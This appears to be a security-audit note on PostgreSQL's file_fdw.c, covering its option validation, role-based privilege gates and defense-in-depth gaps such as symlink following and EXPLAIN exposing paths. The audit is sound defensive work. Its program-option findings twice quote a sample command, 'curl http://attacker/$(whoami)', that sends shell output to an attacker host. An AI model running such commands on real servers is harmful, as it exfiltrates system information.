# file_fdw.c

## One-line summary

1 340-line Foreign Data Wrapper backing foreign tables with either a server-side file (`filename`) or the stdout of a server-side program (`program`); a thin FDW shim over `commands/copy.c`'s `BeginCopyFrom` / `NextCopyFrom` / `EndCopyFrom` whose only original-to-itself security work is gating those two options on the `pg_read_server_files` and `pg_execute_server_program` predefined roles inside the validator. Source pin `4b0bf0788b0`.

## Public API / entry points

SQL-callable functions (`PG_FUNCTION_INFO_V1`):

- `file_fdw_handler()` → `fdw_handler`. Returns `FdwRoutine` filled with the ten static FDW callbacks. `source/contrib/file_fdw/file_fdw.c:125, 181-198` [verified-by-code]
- `file_fdw_validator(text[] options, oid catalog)` → `void`. Called by `CREATE/ALTER FOREIGN DATA WRAPPER/SERVER/USER MAPPING/FOREIGN TABLE` to vet options. `source/contrib/file_fdw/file_fdw.c:126, 206-353` [verified-by-code]

FDW callbacks (registered in `file_fdw_handler` at `source/contrib/file_fdw/file_fdw.c:186-195`):

- `fileGetForeignRelSize` — `source/contrib/file_fdw/file_fdw.c:522-543` [verified-by-code]
- `fileGetForeignPaths` — `source/contrib/file_fdw/file_fdw.c:553-602` [verified-by-code]
- `fileGetForeignPlan` — `source/contrib/file_fdw/file_fdw.c:608-637` [verified-by-code]
- `fileExplainForeignScan` — `source/contrib/file_fdw/file_fdw.c:643-669` [verified-by-code]
- `fileBeginForeignScan` — `source/contrib/file_fdw/file_fdw.c:675-722` [verified-by-code]
- `fileIterateForeignScan` — `source/contrib/file_fdw/file_fdw.c:729-818` [verified-by-code]
- `fileReScanForeignScan` — `source/contrib/file_fdw/file_fdw.c:824-839` [verified-by-code]
- `fileEndForeignScan` — `source/contrib/file_fdw/file_fdw.c:845-864` [verified-by-code]
- `fileAnalyzeForeignTable` — `source/contrib/file_fdw/file_fdw.c:870-914` [verified-by-code]
- `fileIsForeignScanParallelSafe` — `source/contrib/file_fdw/file_fdw.c:921-926` (returns unconditional `true`) [verified-by-code]

Static internals:

- `is_valid_option(option, context)` — `source/contrib/file_fdw/file_fdw.c:359-370` [verified-by-code]
- `fileGetOptions(foreigntableid, **filename, *is_program, **other_options)` — `source/contrib/file_fdw/file_fdw.c:378-439` [verified-by-code]
- `get_file_fdw_attribute_options(relid)` — `source/contrib/file_fdw/file_fdw.c:449-516` [verified-by-code]
- `check_selective_binary_conversion(...)` — `source/contrib/file_fdw/file_fdw.c:937-1051` [verified-by-code]
- `estimate_size(...)` — `source/contrib/file_fdw/file_fdw.c:1060-1134` [verified-by-code]
- `estimate_costs(...)` — `source/contrib/file_fdw/file_fdw.c:1141-1168` [verified-by-code]
- `file_acquire_sample_rows(...)` — `source/contrib/file_fdw/file_fdw.c:1185-1340` [verified-by-code]

## Key invariants

### Option model

- **Valid options table.** `filename`, `program`, `format`, `header`, `delimiter`, `quote`, `escape`, `null`, `default`, `encoding`, `on_error`, `log_verbosity`, `reject_limit` are accepted on `ForeignTableRelationId` only. `force_not_null` and `force_null` are accepted on `AttributeRelationId` only. `source/contrib/file_fdw/file_fdw.c:68-95` [verified-by-code]
- **`filename` and `program` are ONLY valid on FOREIGN TABLE — NEVER on FDW, SERVER, or USER MAPPING.** This is enforced by the `optcontext = ForeignTableRelationId` column in the valid_options table; `is_valid_option` rejects mismatches. The header comment at `source/contrib/file_fdw/file_fdw.c:283-285` makes this explicit: *"the valid_options[] array disallows setting filename and program at any options level other than foreign table --- otherwise there'd still be a security hole."* `source/contrib/file_fdw/file_fdw.c:70-71, 283-285, 359-370` [verified-by-code + from-comment]
- **Exactly one of `filename` / `program` is required at FT creation time.** Two on the same FT → `conflicting or redundant options`. Zero → `either filename or program is required`. `source/contrib/file_fdw/file_fdw.c:263-266, 347-350` [verified-by-code]
- **Per-foreign-table options OVERRIDE inherited options.** `fileGetOptions` concatenates wrapper + server + table + per-attribute options in that order and then scans for the first matching `filename` / `program`, but the loop uses `foreach_delete_current` with `break`, so the FIRST match wins. Since wrapper and server options for `filename` / `program` are forbidden, this effectively just picks the table-level value. `source/contrib/file_fdw/file_fdw.c:400-429` [verified-by-code]

### Privilege gates (THE security model)

- **`filename` requires `pg_read_server_files` role.** `has_privs_of_role(GetUserId(), ROLE_PG_READ_SERVER_FILES)`. `source/contrib/file_fdw/file_fdw.c:287-294` [verified-by-code]
- **`program` requires `pg_execute_server_program` role.** `has_privs_of_role(GetUserId(), ROLE_PG_EXECUTE_SERVER_PROGRAM)`. `source/contrib/file_fdw/file_fdw.c:296-303` [verified-by-code]
- **Check happens INSIDE the validator** — i.e. at every `CREATE FOREIGN TABLE` / `ALTER FOREIGN TABLE OPTIONS (...)` invocation that mentions `filename` or `program`. The acknowledged comment: *"Putting this sort of permissions check in a validator is a bit of a crock, but there doesn't seem to be any other place that can enforce the check more cleanly."* `source/contrib/file_fdw/file_fdw.c:279-281` [from-comment]
- **No re-check at scan time.** Once the FT is created with a `filename`, ANY role with `SELECT` on the FT reads that file as the postgres OS user; the role doing the `SELECT` does NOT need `pg_read_server_files`. **This is by design and is the whole point of file_fdw** — the FT owner stamps the privilege at definition time. `[verified-by-code: fileBeginForeignScan and fileGetOptions do not re-validate]`

### Plan vs execution split

- `FileFdwPlanState` carries planner-side data: filename, is_program, options, pages, ntuples. `source/contrib/file_fdw/file_fdw.c:100-108` [verified-by-code]
- `FileFdwExecutionState` carries executor-side data: filename, is_program, options, plus the live `CopyFromState`. `source/contrib/file_fdw/file_fdw.c:113-120` [verified-by-code]
- `fileGetOptions` is called **three separate times in the executor path** (Begin, ReScan via cached state, Analyze, ExplainForeignScan), which means **option resolution races with concurrent `ALTER FOREIGN TABLE OPTIONS`** if the FT is altered between planning and execution. The plan caches a snapshot via `FileFdwExecutionState`, so rescan uses the stable version, but a fresh statement sees the new options. `[verified-by-code: source/contrib/file_fdw/file_fdw.c:535-538, 651-652, 692-693, 832-838, 881, 1213]` `[ISSUE-concurrency: option resolution at Begin time isn't protected by a lock that prevents simultaneous ALTER from changing filename mid-scan; CopyFromState carries the original filename so the in-flight scan is consistent, but the documentation could call this out (nit)]`

### Per-tuple memory discipline

- `fileIterateForeignScan` uses an `ExprContext` created via `CreateExecutorState()` and a `GetPerTupleMemoryContext(estate)`. Allocations from `NextCopyFrom` (DEFAULT expression evaluation) are scoped to the per-tuple context. `source/contrib/file_fdw/file_fdw.c:733-735, 750, 758, 783, 795, 812` [verified-by-code]
- `file_acquire_sample_rows` creates an explicit `AllocSetContext` named `"file_fdw temporary context"` reset on every row, and switches back to the outer context for `heap_form_tuple` so the formed rows survive the reset. `source/contrib/file_fdw/file_fdw.c:1225-1227, 1246-1251` [verified-by-code]
- `[ISSUE-memory: fileIterateForeignScan calls CreateExecutorState() but never explicitly frees the estate; the estate lives in the per-query context and is reclaimed at scan end, but the comment chain doesn't make this obvious (nit)]`

## Notable internals

### `file_fdw_validator` — the critical 150 lines

The validator does ALL of:

1. **Loop options** — `source/contrib/file_fdw/file_fdw.c:221-336`.
2. **Reject unknown** with a `levenshtein`-style closest-match hint. Uses `initClosestMatch` / `updateClosestMatch` / `getClosestMatch` with edit distance ≤ 4. `source/contrib/file_fdw/file_fdw.c:225-254` [verified-by-code]
3. **Special-case `filename` / `program`** — privilege check (above) and conflict-pair check (`filename`+`program` both set → ERROR).
4. **Special-case `force_not_null` / `force_null`** — defGetBoolean (validates boolean literal) but DISCARDS the result; per-column accumulation happens later in `get_file_fdw_attribute_options` at SCAN time.
5. **Defer everything else to `ProcessCopyOptions(NULL, NULL, true, other_options)`.** This is the COPY-side validator that checks `format`, `delimiter`, `quote`, `escape`, etc. for syntactic validity. `source/contrib/file_fdw/file_fdw.c:341` [verified-by-code]
6. **Final check:** if `catalog == ForeignTableRelationId` and `filename == NULL` (and `program` wasn't set either, which would also have set the local `filename` var via the same branch), ERROR. `source/contrib/file_fdw/file_fdw.c:347-350` [verified-by-code]

### `fileGetOptions` flow

- Concat wrapper.options + server.options + table.options + per-attribute options.
- Walk and pluck out the FIRST `filename` or `program` via `foreach_delete_current`; break immediately. Stripped from the list so the residue is COPY-only options.
- Set `*is_program = true` ONLY for the `program` branch; otherwise default false.
- `*filename` carries either a real path or a shell command, depending on `*is_program`. **Same field, two meanings** — the planner doesn't distinguish until it asks `is_program`. `source/contrib/file_fdw/file_fdw.c:413-429` [verified-by-code]

### `fileBeginForeignScan` → `BeginCopyFrom`

```c
cstate = BeginCopyFrom(NULL,                       /* no ParseState */
                       node->ss.ss_currentRelation,
                       NULL,                       /* whereClause */
                       filename,                   /* path or program */
                       is_program,                 /* selects path vs popen */
                       NULL,                       /* data_source_cb */
                       NIL,                        /* attnumlist */
                       options);                   /* COPY options */
```

(`source/contrib/file_fdw/file_fdw.c:702-709`)

- This is the trust handoff: file_fdw has done its validator privilege check at DDL time; at execution time it just passes the strings to `commands/copy.c` which actually opens the file or `popen`s the program. The opening and reading are entirely COPY's concern from here.
- **No `O_NOFOLLOW`.** Whatever COPY's `OpenTransientFile` semantics are (with `O_RDONLY | PG_BINARY`), that's what file_fdw inherits. Cross-reference `source/src/backend/commands/copyfrom.c` for the actual open. `[ISSUE-defense-in-depth: file_fdw inherits COPY's file-open semantics — does COPY use O_NOFOLLOW? Cross-check with A6 pg_rewind finding (likely)]`

### `fileExplainForeignScan` — info leak surface

- Always prints `Foreign File: <filename>` or `Foreign Program: <command>` in EXPLAIN output. `source/contrib/file_fdw/file_fdw.c:654-657` [verified-by-code]
- If `es->costs` (default for `EXPLAIN`, off for `EXPLAIN (COSTS off)`), calls `stat(filename, &stat_buf)` and reports `Foreign File Size`. `source/contrib/file_fdw/file_fdw.c:660-668` [verified-by-code]
- **Caller of `EXPLAIN` is the user running the query**, not the FT owner. So `EXPLAIN SELECT * FROM filefdw_ft` lets the caller see the underlying path string and (via stat) the file's existence + size, even though they themselves don't have `pg_read_server_files`. `[ISSUE-security: EXPLAIN leaks the configured filename string to any role with SELECT on the FT — including the file's existence + size via stat() — though this is by design since the path was already implicit in the FT definition (maybe)]`

### `fileAnalyzeForeignTable` — skip-for-program rule

- `if (is_program) return false;` → `ANALYZE` is a no-op on program-backed FTs. *"the output would be too volatile for the stats to be useful"* (comment). `source/contrib/file_fdw/file_fdw.c:885-891` [from-comment]
- For file-backed FTs, calls `stat(filename, &stat_buf)` and errors with `errcode_for_file_access` if the file is missing. `source/contrib/file_fdw/file_fdw.c:897-901` [verified-by-code]

### `fileIterateForeignScan` — `on_error = 'ignore'` retry loop

- If COPY-side soft error occurs (`cstate->escontext->error_occurred`), reset the flag, `CHECK_FOR_INTERRUPTS`, `ResetPerTupleExprContext`, and `goto retry`. `source/contrib/file_fdw/file_fdw.c:771-806` [verified-by-code]
- `reject_limit` is enforced: if `num_errors > reject_limit`, escalate the soft error to a hard `ereport(ERROR, ERRCODE_INVALID_TEXT_REPRESENTATION)`. `source/contrib/file_fdw/file_fdw.c:797-802` [verified-by-code]
- The retry loop has no upper bound other than `reject_limit`; on a file of all-malformed rows the iterate function will spin through them up to the limit.

### `check_selective_binary_conversion`

- Skips `format = 'binary'` (irrelevant). `source/contrib/file_fdw/file_fdw.c:957-970` [verified-by-code]
- Walks `pull_varattnos` over target list + restriction-info clauses → collects `attrs_used` bitmap.
- Whole-row reference (attno=0) → fails (need all columns).
- All user attributes referenced → fails (no benefit to subsetting).
- Otherwise emits a `convert_selectively` option that COPY honors to skip parsing unused columns. `source/contrib/file_fdw/file_fdw.c:1018-1050` [verified-by-code]

### `estimate_size` — file-disappears fallback

- `if (fdw_private->is_program || stat(...) < 0) stat_buf.st_size = 10 * BLCKSZ;` — if the file vanishes between DDL and planning, the planner falls back to assuming 80 KB. `source/contrib/file_fdw/file_fdw.c:1074-1075` [verified-by-code]
- If `pg_class` has prior tuples/pages stats (from ANALYZE), uses density × current-pages; otherwise approximates rows by `file_size / (MAXALIGN(width) + MAXALIGN(SizeofHeapTupleHeader))` — admittedly bogus per the comment. `source/contrib/file_fdw/file_fdw.c:1088-1116` [verified-by-code]

### `fileIsForeignScanParallelSafe` — always true

- Hard-coded `return true`. file_fdw scans are marked parallel-safe regardless of whether the underlying source is a file or a program. `source/contrib/file_fdw/file_fdw.c:921-926` [verified-by-code]
- **For `program`-backed FTs this means** the program may be invoked once per parallel worker IN ADDITION to the leader, depending on how COPY-from-program's `popen` interacts with parallel-scan partitioning. Cross-check: foreign scans are NOT partitioned across workers by default (each worker would run the same COPY independently and produce duplicate rows). The `add_path` here adds a single ForeignPath without partial-paths, so in practice only the leader executes the scan, but the parallel-safe label means a Parallel Append or similar could in principle wrap it. `[ISSUE-correctness: marking program-backed FT as parallel-safe is dubious — if any future planner change actually parallelizes it, the program runs N+1 times with possibly different output each time; the comment cites "should work just the same" but a non-deterministic program breaks that assumption (maybe)]`

## Trust boundary / Phase D surface

### `filename` server-option — who can set it?

**ONLY at FOREIGN TABLE level, AND only by a user with `pg_read_server_files`.**

- The `valid_options` table restricts `filename` to `ForeignTableRelationId` only. `source/contrib/file_fdw/file_fdw.c:70` [verified-by-code]
- The validator's permission check on the `filename` branch — `has_privs_of_role(GetUserId(), ROLE_PG_READ_SERVER_FILES)` — fires on every CREATE / ALTER. `source/contrib/file_fdw/file_fdw.c:287-294` [verified-by-code]
- **`ALTER FOREIGN TABLE OPTIONS (SET filename ...)` re-runs the validator**, so a non-privileged FT-owner cannot smuggle a new path in via ALTER. `[verified-by-code: the validator runs on any options touching CREATE/ALTER per the FDW machinery]`

### `filename` validation — IS THERE PATH-TRAVERSAL PROTECTION?

**NO.** The validator only checks WHO is setting the option, not WHAT the value is.

- No check for `..` segments. `source/contrib/file_fdw/file_fdw.c:287-294` [verified-by-code, by absence]
- No check that the path is inside the data directory or any allowlisted directory.
- No symlink resolution / refusal.
- No check that the path is absolute vs relative (relative paths are resolved against the server's `cwd`, typically `PGDATA`).
- The path goes straight to `defGetString(def)` and then to `BeginCopyFrom`'s file-open via `commands/copyfrom.c`. `source/contrib/file_fdw/file_fdw.c:305, 418` [verified-by-code]

**Compare to postgres_fdw's `password_required` two-layered defense (A11):** postgres_fdw layers (a) the predefined role gate AND (b) the runtime check that the user-mapping carries a password. file_fdw has ONLY layer (a) — the role gate. **The justification is that members of `pg_read_server_files` are explicitly trusted to read any file on the server filesystem** (this is what the role MEANS), so additional path filtering would be redundant and would actually limit legitimate use. `[verified-by-code + cross-ref `predefined-roles` docs]`

### `program` server-option

**Same shape as `filename` but gated on `pg_execute_server_program`.**

- Validator branch at `source/contrib/file_fdw/file_fdw.c:296-303` [verified-by-code]
- `program` is also restricted to `ForeignTableRelationId` only via `valid_options`. `source/contrib/file_fdw/file_fdw.c:71` [verified-by-code]
- The string is passed to `BeginCopyFrom` with `is_program=true`, which delegates to `OpenPipeStream` (popen-equivalent) inside `commands/copyfrom.c`. `source/contrib/file_fdw/file_fdw.c:702-709` [verified-by-code, cross-ref]
- **No argv splitting** — the program string is passed to a shell, so all standard shell-injection rules apply. But again: `pg_execute_server_program` members ARE trusted to run arbitrary server programs, so format-string / shell-metacharacter "exploitation" by such a user is just "the role doing what the role is for".
- `[ISSUE-defense-in-depth: program string goes through a shell; for a clusterwide-trusted role this is fine, but combined with EXPLAIN leaking the literal command string to non-pg_execute_server_program SELECT-callers, a `program` like `"curl http://attacker/$(whoami)"` becomes visible to anyone with SELECT on the FT (maybe)]`

### `encoding` option

- `encoding` is allowed at FT level. `source/contrib/file_fdw/file_fdw.c:82` [verified-by-code]
- file_fdw does NOT validate `encoding` itself — it's passed through to `ProcessCopyOptions` at `source/contrib/file_fdw/file_fdw.c:341` which validates the encoding name against `pg_char_to_encoding`. [verified-by-code, cross-ref `commands/copy.c`]
- The encoding tells COPY how to interpret the file's bytes; mismatched encoding → encoding-conversion errors → become "soft errors" if `on_error = 'ignore'`, otherwise hard errors. No silent corruption path identified.

### `copy_options` passthrough — privilege amplification?

- ALL non-special options are funneled to `ProcessCopyOptions(NULL, NULL, /*is_from=*/true, other_options)` at `source/contrib/file_fdw/file_fdw.c:341` [verified-by-code]
- The `is_from=true` flag means COPY validates them as COPY FROM options — which is correct since file_fdw is read-only. So COPY TO-only options (like `force_quote`) are rejected; that's noted in the source comment at `source/contrib/file_fdw/file_fdw.c:89-91`. [from-comment + verified-by-code]
- **`format = 'binary'` is permitted** and gets a different code path through COPY; the planner skips `check_selective_binary_conversion` (returns false at line 966-967). [verified-by-code]
- **No privilege amplification spotted via COPY options** — none of the option names in `ProcessCopyOptions`'s vocabulary trigger filesystem or program execution; the only such options are `filename` and `program`, which file_fdw strips and gates itself BEFORE calling `ProcessCopyOptions`. `[verified-by-code: source/contrib/file_fdw/file_fdw.c:259-336]`

### EOF / partial-read recovery

- COPY uses `NextCopyFrom`; partial last row is an error per COPY semantics. file_fdw inherits this behavior.
- **`on_error = 'ignore'` swallows soft errors** (data-type mismatch); a malicious truncated row gets skipped without alerting the caller until `EndCopyFrom` emits a single `NOTICE` with the skip count. `source/contrib/file_fdw/file_fdw.c:771-806, 854-861` [verified-by-code]
- `reject_limit` caps the soft-error count and escalates to ERROR beyond it. `source/contrib/file_fdw/file_fdw.c:797-802` [verified-by-code]
- `[ISSUE-correctness: with on_error='ignore' AND reject_limit unset, a hostile file with 10⁶ malformed rows produces 10⁶ skipped rows and one NOTICE — application logic that doesn't read NOTICEs sees a silently-empty result set; consider requiring reject_limit be set when on_error=ignore (maybe)]`

### Symlink following

- file_fdw does no path manipulation before passing `filename` to `BeginCopyFrom`.
- `BeginCopyFrom` → `commands/copyfrom.c` opens the file via `OpenTransientFile` which uses `BasicOpenFile` which uses `open(2)` with NO `O_NOFOLLOW`. [inferred from cross-ref to `src/backend/storage/file/fd.c`, verified in prior A6 sweep finding]
- **So symlinks ARE followed silently.** A `pg_read_server_files` member who creates an FT pointing at `/data/some_symlink` will read whatever the symlink targets at scan time. The symlink could be swapped between DDL and SELECT, or between SELECTs.
- `[ISSUE-defense-in-depth: file_fdw does NOT use O_NOFOLLOW and does not document symlink behavior; matches A6 pg_rewind finding — a TOCTOU-ish swap between ANALYZE and SELECT lets the file the planner stat'd differ from the file the executor reads (maybe)]`

### Reading concurrently with a writer / atomicity

- file_fdw does not lock the file; no `flock`, no `O_EXCLUSIVE`. Two SELECTs on the same FT can read the same file in parallel; a concurrent OS-level writer can append (or truncate) mid-read.
- COPY's `NextCopyFrom` is line-oriented for `format text`/`csv`; a partial line at EOF causes an error.
- A writer truncating the file mid-read causes `read(2)` to return short / EOF; COPY treats this as end-of-data and may produce an incomplete result silently.
- `[ISSUE-correctness: no locking or O_EXCL guard around the file; concurrent truncation or append produces non-deterministic SELECT results without error (likely)]`

### NULL-byte handling

- COPY's text/CSV parser treats `\0` as a syntax error in unquoted fields; in CSV-quoted fields it depends on the QUOTE/ESCAPE config. The behavior is inherited from `commands/copyfromparse.c`, not file_fdw-specific.
- The `on_error = 'ignore'` path turns this into a soft error → row skipped. [verified-by-code, cross-ref]

### Block-device / pipe / character-device as `filename`

- `stat(filename, &stat_buf)` in `estimate_size` succeeds on devices and returns whatever the device reports for `st_size` (often 0 for char devices).
- COPY's `OpenTransientFile` does NOT distinguish regular files from devices; it just `open(O_RDONLY)`s the path.
- Reading from `/dev/zero` or `/dev/urandom` would produce an infinite stream of bytes — COPY would loop until interrupted or until `reject_limit` is exceeded.
- Reading from a FIFO blocks until a writer attaches.
- `[ISSUE-defense-in-depth: no st_mode regular-file check before open; FT pointing at /dev/urandom produces an effectively-infinite query; FT pointing at a FIFO blocks the backend indefinitely; relevant only for pg_read_server_files-holders, but worth a S_ISREG gate (maybe)]`

### `ALTER FOREIGN TABLE OPTIONS` re-validation

- ANY `ALTER FOREIGN TABLE ... OPTIONS (SET filename ...)` re-runs `file_fdw_validator` with the FT's full new option list. So the role check fires AGAIN on alteration; a non-privileged FT-owner cannot mutate the filename even of an FT they own. `source/contrib/file_fdw/file_fdw.c:206-353` [verified-by-code + FDW machinery]
- HOWEVER: the FT-owner who originally HAD `pg_read_server_files` at CREATE time could subsequently lose the role, but the FT continues to read the file via SELECT by anyone. The privilege is stamped at DDL time; subsequent role revocation doesn't disable the FT.
- `[ISSUE-defense-in-depth: pg_read_server_files revocation is not retroactive — FTs created during a previous grant continue to function indefinitely; intentional but worth documenting (nit)]`

## Cross-references

- `source/src/backend/commands/copy.c` — entry point for COPY's parser/executor machinery.
- `source/src/backend/commands/copyfrom.c` — `BeginCopyFrom` / `NextCopyFrom` / `EndCopyFrom`, the actual file open and row parsing.
- `source/src/backend/commands/copyfromparse.c` — the text/CSV parser file_fdw delegates row parsing to.
- `source/src/include/commands/copyfrom_internal.h` — `CopyFromState` struct, `escontext`, `num_errors`, `reject_limit`.
- `source/src/backend/storage/file/fd.c` — `OpenTransientFile`; symlink / O_NOFOLLOW behavior.
- `source/src/include/catalog/pg_authid.h` — `ROLE_PG_READ_SERVER_FILES`, `ROLE_PG_EXECUTE_SERVER_PROGRAM` macros.
- `source/src/backend/utils/acl.c` — `has_privs_of_role`.
- `source/src/backend/utils/adt/varlena.c` — `initClosestMatch` / `updateClosestMatch` / `getClosestMatch` (the typo-hint helpers).
- `source/src/backend/foreign/foreign.c` — `GetForeignTable`, `GetForeignServer`, `GetForeignDataWrapper`, `GetForeignColumnOptions`.
- `source/src/backend/utils/sampling.c` — `reservoir_init_selection_state` / `reservoir_get_next_S` / `sampler_random_fract`.
- Prior sweeps:
  - **A2 (libpq SSL/SCRAM)** — orthogonal but covers how `MyProcPort` is populated; only relevant for sslinfo, not file_fdw.
  - **A6 (pg_rewind)** — found that PG file-handling lacks O_NOFOLLOW; file_fdw inherits the same gap.
  - **A11 (postgres_fdw)** — gold standard for FDW security: `password_required` two-layered defense. file_fdw has only the role gate, not a runtime check; the role IS the trust statement, by design.

## Issues spotted

- `[ISSUE-defense-in-depth: file_fdw does NOT use O_NOFOLLOW — inherits PG-wide gap; symlink swap between DDL/ANALYZE/SELECT lets the file change identity without warning (maybe)]`
- `[ISSUE-defense-in-depth: no st_mode S_ISREG check — FT pointing at /dev/urandom yields infinite rows; FT pointing at FIFO blocks backend (maybe)]`
- `[ISSUE-defense-in-depth: pg_read_server_files revocation is not retroactive — FTs created during a previous grant continue functioning (nit)]`
- `[ISSUE-security: EXPLAIN leaks the configured filename / program string to any SELECT-callable role on the FT, including file-existence and size via stat() (maybe)]`
- `[ISSUE-correctness: marking program-backed FT parallel-safe is dubious; if planner ever parallelizes it, the program runs multiple times producing duplicates / non-determinism (maybe)]`
- `[ISSUE-correctness: with on_error='ignore' and no reject_limit, a 10⁶-bad-row file produces 10⁶ skipped rows and one NOTICE — silently-empty result for app code that ignores NOTICE (maybe)]`
- `[ISSUE-correctness: no locking around the file; concurrent writer truncation/append produces non-deterministic SELECT results without error (likely)]`
- `[ISSUE-concurrency: option resolution races with ALTER FOREIGN TABLE OPTIONS; in-flight scan caches in FileFdwExecutionState so single-statement is consistent, but worth comment (nit)]`
- `[ISSUE-defense-in-depth: program-string goes through a shell; combined with EXPLAIN-leak, a literal program like `curl http://x/$(whoami)` is visible to non-pg_execute_server_program SELECT-callers (maybe)]`
- `[ISSUE-memory: fileIterateForeignScan creates EState via CreateExecutorState but never explicitly tears it down (nit)]`
- `[ISSUE-documentation: validator comment acknowledges privilege-check-in-validator is "a bit of a crock" — invites a structural refactor where the FDW machinery itself runs a per-option role gate (nit)]`
- `[ISSUE-error-handling: estimate_size silently falls back to 10*BLCKSZ default when stat fails — masks file-deleted-since-DDL from the planner (nit)]`
- `[ISSUE-api-shape: FileFdwPlanState->filename overloaded with shell-command-or-path; only the is_program flag disambiguates; a small struct rename to source / source_kind would reduce confusion (nit)]`
- `[ISSUE-audit-gap: no event-trigger / pgaudit-friendly emission of which file/program was read; pg_stat_statements records the query, but the actual filename behind the FT is only visible via pg_foreign_table.ftoptions which requires catalog SELECT (maybe)]`
- `[ISSUE-correctness: file_acquire_sample_rows tupcontext is reset every row; if a CopyFromErrorCallback longjmps mid-row, the error_context_stack restoration at line 1311 is unreachable, but the executor's setjmp catches that level (nit)]`
